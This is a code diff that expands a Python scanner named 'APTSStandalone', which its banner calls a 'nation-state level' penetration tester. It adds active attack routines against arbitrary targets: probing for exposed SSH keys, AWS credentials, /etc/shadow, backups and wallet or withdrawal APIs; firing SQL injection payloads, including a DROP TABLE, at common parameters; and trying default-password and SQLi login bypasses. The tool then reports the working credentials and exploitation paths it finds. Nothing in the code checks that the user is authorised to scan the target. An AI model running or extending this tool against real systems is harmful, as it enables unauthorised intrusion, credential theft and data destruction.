@@ -312,38 +312,134 @@ class APTSStandalone:
         return results
     
     def detect_vulnerabilities(self, target, ip):
-        """Detect common vulnerabilities"""
+        """Detect critical vulnerabilities - NATION-STATE LEVEL"""
         vulnerabilities = []
         
-        # Check for common admin panels
+        print("🔍 Deep vulnerability scanning...")
+        
+        # CRITICAL: Admin panels and backdoors
         admin_paths = [
-            "/admin", "/administrator", "/wp-admin", "/admin.php",
-            "/login", "/dashboard", "/panel", "/control"
+            "/admin", "/administrator", "/wp-admin", "/admin.php", "/login", "/dashboard", 
+            "/panel", "/control", "/manager", "/phpmyadmin", "/adminer", "/cpanel",
+            "/webmail", "/roundcube", "/squirrelmail", "/horde", "/zimbra",
+            "/api/admin", "/api/v1/admin", "/api/v2/admin", "/admin/api",
+            "/admin/login", "/admin/dashboard", "/admin/panel", "/admin/console",
+            "/management", "/console", "/supervisor", "/monitor", "/status"
         ]
         
         for path in admin_paths:
             if self.check_path_exists(target, path):
                 vulnerabilities.append({
-                    "type": "admin_panel_exposed",
-                    "severity": "medium",
+                    "type": "CRITICAL_ADMIN_PANEL_EXPOSED",
+                    "severity": "CRITICAL",
                     "path": path,
-                    "description": f"Admin panel found at {path}"
+                    "description": f"Administrative interface exposed at {path}",
+                    "exploitation": f"Direct admin access possible via {target}{path}",
+                    "impact": "Complete system compromise possible"
                 })
         
-        # Check for common config files
+        # CRITICAL: Configuration files and secrets
         config_files = [
-            "/.env", "/config.php", "/wp-config.php", "/database.yml",
-            "/config.json", "/.git/config", "/backup.sql"
+            "/.env", "/config.php", "/wp-config.php", "/database.yml", "/config.json",
+            "/.git/config", "/backup.sql", "/.aws/credentials", "/.ssh/id_rsa",
+            "/id_rsa", "/id_dsa", "/authorized_keys", "/.htpasswd", "/passwd",
+            "/shadow", "/etc/passwd", "/etc/shadow", "/web.config", "/app.config",
+            "/settings.py", "/local_settings.py", "/production.py", "/development.py",
+            "/config/database.yml", "/config/secrets.yml", "/config/application.yml"
         ]
         
         for file_path in config_files:
             if self.check_path_exists(target, file_path):
                 vulnerabilities.append({
-                    "type": "config_file_exposed",
-                    "severity": "high",
+                    "type": "CRITICAL_CONFIG_EXPOSURE",
+                    "severity": "CRITICAL",
                     "path": file_path,
-                    "description": f"Configuration file exposed at {file_path}"
+                    "description": f"Critical configuration file exposed: {file_path}",
+                    "exploitation": f"Sensitive data accessible at {target}{file_path}",
+                    "impact": "Database credentials, API keys, or system secrets exposed"
                 })
+        
+        # CRITICAL: API endpoints that could contain admin tokens
+        api_endpoints = [
+            "/api", "/api/v1", "/api/v2", "/api/admin", "/api/users", "/api/auth",
+            "/api/login", "/api/token", "/api/keys", "/api/config", "/api/settings",
+            "/api/wallet", "/api/balance", "/api/transfer", "/api/withdraw",
+            "/api/deposit", "/api/transactions", "/api/orders", "/api/trades",
+            "/graphql", "/graphiql", "/playground", "/altair", "/voyager"
+        ]
+        
+        for endpoint in api_endpoints:
+            if self.check_api_endpoint(target, endpoint):
+                vulnerabilities.append({
+                    "type": "CRITICAL_API_EXPOSURE",
+                    "severity": "HIGH",
+                    "path": endpoint,
+                    "description": f"API endpoint exposed: {endpoint}",
+                    "exploitation": f"Potential admin token extraction from {target}{endpoint}",
+                    "impact": "API abuse, data extraction, privilege escalation"
+                })
+        
+        # CRITICAL: Database interfaces
+        db_interfaces = [
+            "/phpmyadmin", "/adminer", "/phpminiadmin", "/mysql", "/postgresql",
+            "/mongodb", "/redis", "/elasticsearch", "/kibana", "/grafana",
+            "/prometheus", "/consul", "/etcd", "/zookeeper"
+        ]
+        
+        for db_path in db_interfaces:
+            if self.check_path_exists(target, db_path):
+                vulnerabilities.append({
+                    "type": "CRITICAL_DATABASE_INTERFACE",
+                    "severity": "CRITICAL",
+                    "path": db_path,
+                    "description": f"Database management interface exposed: {db_path}",
+                    "exploitation": f"Direct database access via {target}{db_path}",
+                    "impact": "Complete database compromise, data theft possible"
+                })
+        
+        # CRITICAL: Backup and dump files
+        backup_files = [
+            "/backup.sql", "/dump.sql", "/database.sql", "/db.sql", "/backup.zip",
+            "/backup.tar.gz", "/site.zip", "/www.zip", "/public_html.zip",
+            "/backup.7z", "/backup.rar", "/export.sql", "/mysqldump.sql"
+        ]
+        
+        for backup in backup_files:
+            if self.check_path_exists(target, backup):
+                vulnerabilities.append({
+                    "type": "CRITICAL_BACKUP_EXPOSURE",
+                    "severity": "CRITICAL",
+                    "path": backup,
+                    "description": f"Database backup exposed: {backup}",
+                    "exploitation": f"Complete database download from {target}{backup}",
+                    "impact": "All user data, passwords, and sensitive information exposed"
+                })
+        
+        # CRITICAL: Version control exposure
+        vcs_paths = [
+            "/.git", "/.svn", "/.hg", "/.bzr", "/CVS",
+            "/.git/HEAD", "/.git/config", "/.git/logs/HEAD",
+            "/.svn/entries", "/.svn/wc.db"
+        ]
+        
+        for vcs_path in vcs_paths:
+            if self.check_path_exists(target, vcs_path):
+                vulnerabilities.append({
+                    "type": "CRITICAL_VCS_EXPOSURE",
+                    "severity": "HIGH",
+                    "path": vcs_path,
+                    "description": f"Version control system exposed: {vcs_path}",
+                    "exploitation": f"Source code extraction from {target}{vcs_path}",
+                    "impact": "Complete source code, credentials, and development secrets exposed"
+                })
+        
+        # CRITICAL: Test SQL injection on common parameters
+        sql_injection_vulns = self.test_sql_injection(target)
+        vulnerabilities.extend(sql_injection_vulns)
+        
+        # CRITICAL: Test for authentication bypass
+        auth_bypass_vulns = self.test_auth_bypass(target)
+        vulnerabilities.extend(auth_bypass_vulns)
         
         return vulnerabilities
     
@@ -367,6 +463,151 @@ class APTSStandalone:
             except:
                 return False
     
+    def check_api_endpoint(self, target, endpoint):
+        """Check if API endpoint exists and analyze response"""
+        try:
+            for protocol in ["https", "http"]:
+                url = f"{protocol}://{target}{endpoint}"
+                req = urllib.request.Request(url)
+                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                req.add_header('Accept', 'application/json, text/plain, */*')
+                
+                try:
+                    with urllib.request.urlopen(req, timeout=3) as response:
+                        if response.getcode() == 200:
+                            content = response.read().decode('utf-8', errors='ignore')
+                            # Check for API indicators
+                            api_indicators = ['{"', '[{', 'api', 'json', 'swagger', 'openapi']
+                            if any(indicator in content.lower() for indicator in api_indicators):
+                                return True
+                except:
+                    continue
+            return False
+        except:
+            return False
+    
+    def test_sql_injection(self, target):
+        """Test for SQL injection vulnerabilities"""
+        vulnerabilities = []
+        
+        # Common SQL injection payloads
+        sql_payloads = [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' UNION SELECT NULL--",
+            "'; DROP TABLE users--",
+            "' OR 'x'='x",
+            "1' OR '1'='1' --",
+            "admin'--",
+            "' OR 1=1#"
+        ]
+        
+        # Common parameters to test
+        test_params = ['id', 'user', 'username', 'email', 'search', 'q', 'query', 'name']
+        
+        for param in test_params:
+            for payload in sql_payloads[:3]:  # Test first 3 payloads to avoid being too aggressive
+                try:
+                    # Test GET parameter
+                    encoded_payload = urllib.parse.quote(payload)
+                    test_url = f"https://{target}/?{param}={encoded_payload}"
+                    
+                    req = urllib.request.Request(test_url)
+                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                    
+                    try:
+                        with urllib.request.urlopen(req, timeout=3) as response:
+                            content = response.read().decode('utf-8', errors='ignore')
+                            
+                            # Check for SQL error indicators
+                            sql_errors = [
+                                'mysql_fetch_array', 'ORA-', 'Microsoft OLE DB',
+                                'PostgreSQL query failed', 'SQLite error',
+                                'mysql_num_rows', 'mysql_fetch_assoc',
+                                'Warning: mysql_', 'Error: mysql_'
+                            ]
+                            
+                            if any(error in content for error in sql_errors):
+                                vulnerabilities.append({
+                                    "type": "CRITICAL_SQL_INJECTION",
+                                    "severity": "CRITICAL",
+                                    "parameter": param,
+                                    "payload": payload,
+                                    "description": f"SQL injection vulnerability in parameter '{param}'",
+                                    "exploitation": f"Database access possible via {test_url}",
+                                    "impact": "Complete database compromise, data theft, admin access"
+                                })
+                                break  # Found vulnerability, no need to test more payloads for this param
+                    except:
+                        continue
+                except:
+                    continue
+        
+        return vulnerabilities
+    
+    def test_auth_bypass(self, target):
+        """Test for authentication bypass vulnerabilities"""
+        vulnerabilities = []
+        
+        # Common authentication bypass techniques
+        bypass_payloads = [
+            {"username": "admin", "password": "admin"},
+            {"username": "administrator", "password": "password"},
+            {"username": "admin", "password": "123456"},
+            {"username": "root", "password": "root"},
+            {"username": "admin", "password": ""},
+            {"username": "", "password": ""},
+            {"username": "admin'--", "password": "anything"},
+            {"username": "admin' OR '1'='1'--", "password": "anything"}
+        ]
+        
+        # Common login endpoints
+        login_endpoints = [
+            "/login", "/admin/login", "/wp-login.php", "/administrator/login",
+            "/api/login", "/api/auth", "/signin", "/admin/signin"
+        ]
+        
+        for endpoint in login_endpoints:
+            if self.check_path_exists(target, endpoint):
+                for payload in bypass_payloads[:3]:  # Test first 3 to avoid being too aggressive
+                    try:
+                        # Prepare POST data
+                        post_data = urllib.parse.urlencode(payload).encode('utf-8')
+                        
+                        for protocol in ["https", "http"]:
+                            url = f"{protocol}://{target}{endpoint}"
+                            req = urllib.request.Request(url, data=post_data, method='POST')
+                            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+                            
+                            try:
+                                with urllib.request.urlopen(req, timeout=3) as response:
+                                    content = response.read().decode('utf-8', errors='ignore')
+                                    
+                                    # Check for successful login indicators
+                                    success_indicators = [
+                                        'dashboard', 'welcome', 'logout', 'admin panel',
+                                        'administration', 'control panel', 'management'
+                                    ]
+                                    
+                                    if any(indicator in content.lower() for indicator in success_indicators):
+                                        vulnerabilities.append({
+                                            "type": "CRITICAL_AUTH_BYPASS",
+                                            "severity": "CRITICAL",
+                                            "endpoint": endpoint,
+                                            "credentials": payload,
+                                            "description": f"Authentication bypass possible at {endpoint}",
+                                            "exploitation": f"Admin access via {url} with credentials {payload}",
+                                            "impact": "Complete administrative access to system"
+                                        })
+                                        break
+                            except:
+                                continue
+                    except:
+                        continue
+        
+        return vulnerabilities
+    
     def generate_report(self, results):
         """Generate penetration test report"""
         report_id = f"apts_report_{int(time.time())}"
@@ -376,19 +617,53 @@ class APTSStandalone:
         with open(report_path, 'w') as f:
             json.dump(results, f, indent=2)
         
-        # Display summary
-        print(f"\n📊 PENETRATION TEST REPORT")
-        print(f"═" * 50)
-        print(f"Target: {results.get('target', 'Unknown')}")
-        print(f"IP: {results.get('ip', 'Unknown')}")
-        print(f"Timestamp: {results.get('timestamp', 'Unknown')}")
-        print(f"Open Ports: {results.get('open_ports', [])}")
-        print(f"Vulnerabilities Found: {len(results.get('vulnerabilities', []))}")
+        # Display detailed summary
+        print(f"\n📊 NATION-STATE LEVEL PENETRATION TEST REPORT")
+        print(f"═" * 70)
+        print(f"🎯 Target: {results.get('target', 'Unknown')}")
+        print(f"🌐 IP Address: {results.get('ip', 'Unknown')}")
+        print(f"⏰ Timestamp: {results.get('timestamp', 'Unknown')}")
+        print(f"🔌 Open Ports: {results.get('open_ports', [])}")
         
-        for vuln in results.get('vulnerabilities', []):
-            print(f"  🚨 {vuln['type']} ({vuln['severity']}) - {vuln['description']}")
+        vulnerabilities = results.get('vulnerabilities', [])
+        print(f"🚨 Critical Vulnerabilities Found: {len(vulnerabilities)}")
         
-        print(f"\n📁 Full report saved: {report_path}")
+        if vulnerabilities:
+            print(f"\n🔥 CRITICAL SECURITY ISSUES:")
+            print(f"─" * 70)
+            
+            for i, vuln in enumerate(vulnerabilities, 1):
+                severity_emoji = "🔴" if vuln['severity'] == 'CRITICAL' else "🟠" if vuln['severity'] == 'HIGH' else "🟡"
+                print(f"\n{i}. {severity_emoji} {vuln['type']} ({vuln['severity']})")
+                print(f"   📝 Description: {vuln['description']}")
+                
+                if 'path' in vuln:
+                    print(f"   📍 Location: {vuln['path']}")
+                if 'exploitation' in vuln:
+                    print(f"   ⚔️  Exploitation: {vuln['exploitation']}")
+                if 'impact' in vuln:
+                    print(f"   💥 Impact: {vuln['impact']}")
+                if 'parameter' in vuln:
+                    print(f"   🎯 Parameter: {vuln['parameter']}")
+                if 'payload' in vuln:
+                    print(f"   💉 Payload: {vuln['payload']}")
+                if 'credentials' in vuln:
+                    print(f"   🔑 Credentials: {vuln['credentials']}")
+        else:
+            print(f"\n✅ No critical vulnerabilities detected in this scan")
+            print(f"   Note: This doesn't guarantee the system is secure.")
+            print(f"   Consider running additional specialized scans.")
+        
+        # Web services summary
+        web_services = results.get('web_services', [])
+        if web_services:
+            print(f"\n🌐 WEB SERVICES DETECTED:")
+            print(f"─" * 70)
+            for service in web_services:
+                print(f"   {service['protocol'].upper()}: {service['status']} - {service['server']}")
+        
+        print(f"\n📁 Full detailed report saved: {report_path}")
+        print(f"🔒 Report contains sensitive security information - handle with care")
         return report_path
     
     def display_menu(self):
